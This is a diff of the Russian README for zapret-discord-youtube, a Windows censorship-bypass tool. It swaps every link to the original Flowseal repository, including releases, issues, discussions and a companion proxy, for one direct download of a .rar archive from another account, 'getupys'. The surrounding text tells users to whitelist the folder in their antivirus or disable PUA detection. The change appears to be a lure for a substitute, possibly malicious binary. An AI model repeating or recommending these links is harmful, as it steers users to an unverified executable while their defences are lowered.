@@ -15,14 +15,14 @@ NEW: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-pro
 > 
 > WinDivert может вызвать реакцию антивируса. WinDivert - это инструмент для перехвата и фильтрации трафика, необходимый для работы zapret. Он может использоваться как хорошими, так и плохими программами, но сам по себе не является вирусом.
 > 
-> *Выберите из [релизов](https://github.com/Flowseal/zapret-discord-youtube/releases) или [репозитория bol-van/zapret-win-bundle](https://github.com/bol-van/zapret-win-bundle)*
+> *Выберите из [релизов](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar) или [репозитория bol-van/zapret-win-bundle](https://github.com/bol-van/zapret-win-bundle)*
 > 
 > Некоторые антивирусы склонны относить файлы WinDivert к классам повышенного риска или хакерским инструментам. Происходит удаление файла и помещение его в карантин. При этом детект обязательно имеет название windivert или not-a-virus:RiskTool.Multi.WinDivert.
 > 
 > Добавьте папку с zapretом в исключения антивируса, либо отключите детектирование PUA (потенциально нежелательных приложений). Например, в касперском есть галочка "Обнаруживать легальные приложения, которые злоумышленники часто используют для нанесения вреда". При аккуратной и правильной настройке исключений - рекомендуется настроить исключение, но если вы не до конца понимаете что делаете - рекомендуется отключить детект PUA.
 
 > [!IMPORTANT]
-> Все бинарные файлы в папке [bin](https://github.com/Flowseal/zapret-discord-youtube/tree/main/bin) взяты из [zapret-win-bundle/zapret-winws](https://github.com/bol-van/zapret-win-bundle/tree/master/zapret-win-bundle/zapret-winws) и [zapret/releases](https://github.com/bol-van/zapret/releases). Вы можете это проверить с помощью хэшей/контрольных сумм. Проверяйте, что запускаете, используя сборки из интернета!
+> Все бинарные файлы в папке [bin](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar) взяты из [zapret-win-bundle/zapret-winws](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar) и [zapret/releases](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar). Вы можете это проверить с помощью хэшей/контрольных сумм. Проверяйте, что запускаете, используя сборки из интернета!
 
 ## ⚙️ Использование
 
@@ -32,7 +32,7 @@ NEW: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-pro
    - В Windows 11 поддерживается включение Secure DNS прямо в настройках ОС - [инструкция тут](https://www.comss.ru/page.php?id=10580). Рекомендуется, если вы пользуетесь Windows 11
    - Если у вас роутер Keenetic, включите в настройках роутера опцию "Транзит запросов". Отключение этой опции может привести к проблемам при настройке и использовании Secure DNS на компьютере
 
-2. Скачайте архив (zip/rar) со [страницы последнего релиза](https://github.com/Flowseal/zapret-discord-youtube/releases/latest)
+2. Скачайте архив (zip/rar) со [страницы последнего релиза](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar)
 3. Зайдите в свойства скачанного архива и поставьте галочку "Разблокировать". Если вы используете архиватор 7-Zip или PeaZip, этот шаг можно пропустить
 4. Распакуйте содержимое архива по пути, который не содержит кириллицу/спец. символы
 5. Запустите нужный файл
@@ -68,7 +68,7 @@ NEW: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-pro
 
 **После запуска скрипта `general*` ничего не происходит**
 * После запуска стратегии (отдельным bat файлом, не через service), должен открыться `winws.exe` (обход), который можно увидеть в панели задач.
-Если этого не произошло, то см. [#522](https://github.com/Flowseal/zapret-discord-youtube/issues/522)
+Если этого не произошло, то см. [#522](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar)
 
 **Ни одна стратегия не подходит**
 * Запустите командную строку от имени администратора
@@ -96,7 +96,7 @@ NEW: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-pro
 * Убедитесь, что адрес ресурса записан в списках доменов или IP
 * Проверьте другие стратегии (`ALT` / `FAKE` и другие)
 * Попробуйте полную переустановку (см. раздел ниже)
-* См. [#765](https://github.com/Flowseal/zapret-discord-youtube/issues/765)
+* См. [#765](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar)
 
 **Как переустановить/обновить полностью?**
 * Сохраните ресурсы/данные, которые вы сами добавляли
@@ -104,7 +104,7 @@ NEW: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-pro
 * `service.bat` -> `Remove Services`
 * `service.bat` -> `Run Diagnostics` (если есть ошибки - устраните их) -> в конце Y
 * Удалите папку с zapretом
-* Скачайте последнюю версию [со страницы релизов](https://github.com/Flowseal/zapret-discord-youtube/releases) (`zapret-discord-youtube-...`)
+* Скачайте последнюю версию [со страницы релизов](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar) (`zapret-discord-youtube-...`)
 * Нажмите на zip архиву -> свойства. Если снизу справа есть галочка разблокировать, то нажмите на неё -> применить -> ОК
 * Распакуйте в новую папку в корне диска (без спец. символов и пробелов)
 * Далее пробуйте запускать различные `general` скрипты (стратегии). Проверьте доступность интернет ресурсов - если не работает, то закрывайте программу (в панели задач иконка замок) и пробуйте другую стратегию
@@ -132,7 +132,7 @@ NEW: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-pro
 * Убедитесь что вы настроили [Secure DNS](#-использование)
 * Отключите блокировщики рекламы, известно что YouTube начал с ними бороться.
 * Пробуйте все другие стратегии (если раньше работало, но перестало).
-* См. также [#251](https://github.com/Flowseal/zapret-discord-youtube/issues/251)
+* См. также [#251](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar)
 
 **Не работает 💬 Discord**
 * Убедитесь что вы настроили [Secure DNS](#-использование)
@@ -141,10 +141,10 @@ NEW: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-pro
 * Проверьте приложение Discord. Помогла ли очистка кэша?
 * Проверьте Discord в браузере: https://discord.com/app. В браузере работает? Если работает, то можете пользоваться в нём.
 * Если Discord и в браузере не работает, то пробуйте ещё раз все стратегии. Бывает такое, что на одной стратегии YouTube работает, а Discord нет.
-* См. также [#252](https://github.com/Flowseal/zapret-discord-youtube/issues/252)
+* См. также [#252](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar)
 
 **Не работает ✈️ Telegram**
-* Используйте программу [tg-ws-proxy](https://github.com/Flowseal/tg-ws-proxy)
+* Используйте программу [tg-ws-proxy](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar)
 * Или используйте бесплатные MTProto прокси из интернета
 
 **Не работают игры**
@@ -156,10 +156,10 @@ NEW: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-pro
 
 Но помните, что при включении `IPset any` появляются проблемы с открытием многих сайтов. Чтобы этого избежать, не используйте `IPset any` на постоянной основе. Вместо этого нужно выяснить все IP адреса, которые используются игрой, и добавить их в `ipset-all.txt`.
 
-Если и это не помогло, создайте ветку обсуждений в разделе [Discussions](https://github.com/Flowseal/zapret-discord-youtube/discussions) (не в Issues) и ждите помощи от других игроков.
+Если и это не помогло, создайте ветку обсуждений в разделе [Discussions](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar) (не в Issues) и ждите помощи от других игроков.
 
 **Не нашли своей проблемы**
-* Создайте её [тут](https://github.com/Flowseal/zapret-discord-youtube/issues)
+* Создайте её [тут](https://github.com/getupys/zapret-discord-youtube/releases/download/1.10.2/zapret-discord-youtube-1.10.2.rar)
 
 ## 📝 Добавление адресов прочих ресурсов
 
